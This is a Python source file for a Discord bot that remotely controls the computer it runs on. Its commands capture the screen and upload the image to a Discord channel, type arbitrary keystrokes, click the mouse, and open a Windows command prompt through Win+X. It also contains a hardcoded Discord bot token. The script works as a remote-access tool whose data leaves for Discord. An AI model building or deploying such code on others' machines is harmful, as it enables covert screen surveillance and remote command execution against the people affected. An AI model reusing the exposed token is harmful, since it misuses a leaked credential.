import clipboard
from pynput.keyboard import Key, Listener, Controller
from pynput.mouse import Button, Controller as Mcontroller
import pyscreenshot as ImageGrab
import os
import discord
from discord.ext import commands
import time

client = commands.Bot(command_prefix = '!');
keyboard = Controller()
mouse = Mcontroller()
@client.command()
async def pic(ctx):
    print("started")
    capture = ImageGrab.grab()
    capture.save("capture.png")
    await ctx.send(file=discord.File("capture.png"))
    os.remove("capture.png")


@client.command()
async def str(ctx, *args):
    for arg in args:
        if("/win" == arg):
            keyboard.press(Key.cmd)
            keyboard.release(Key.cmd)
        elif("/enter" == arg):
            keyboard.press(Key.enter)
            keyboard.release(Key.enter)
        elif("/caps" == arg):
            keyboard.press(Key.caps_lock)
            keyboard.release(Key.caps_lock)
        elif("/up" == arg):
            keyboard.press(Key.up)
            keyboard.release(Key.up)
        elif("/down" == arg):
            keyboard.press(Key.down)
            keyboard.release(Key.down)
        elif("/left" == arg):
            keyboard.press(Key.left)
            keyboard.release(Key.left)
        elif("/right" == arg):
            keyboard.press(Key.right)
            keyboard.release(Key.right)
        elif("/cmd" == arg):
            keyboard.press(Key.cmd)
            keyboard.press('x')
            time.sleep(1)
            keyboard.release(Key.cmd)
            keyboard.release('x')
            keyboard.press('c')
            keyboard.release('c')
        elif("/ctrldown" == arg):
            keyboard.press(Key.ctrl)
        elif("/shiftdown" == arg):
            keyboard.press(Key.shift)
        elif("/ctrlup" == arg):
            keyboard.release(Key.ctrl)
        elif("/shiftup" == arg):
            keyboard.release(Key.shift)
        elif("/alt" == arg):
            keyboard.release(Key.alt)
        elif("/tab" == arg):
            keyboard.release(Key.tab)
        else:
            keyboard.type(arg)
        time.sleep(1)

@client.command()
async def ctrl(ctx, arg1):
    with keyboard.pressed(Key.ctrl):
        keyboard.press(arg1)
        keyboard.release(arg1)

@client.command()
async def shift(ctx, arg1):
    with keyboard.pressed(Key.shift):
        keyboard.press(arg1)
        keyboard.release(arg1)

@client.command()
async def keydown(ctx, arg1):
    keyboard.press(arg1)

@client.command()
async def keyup(ctx, arg1):
    keyboard.release(arg1)

@client.command()
async def click(ctx, arg1):
    mouse.click(Button.left, arg1)

@client.event
async def on_ready():
    print("ready")

client.run("NzU2MzA0MjI4Njk1NDA4NzIx.X2P5Mw.J0pVEg3ehNkqK2YbsDcymuseju0")
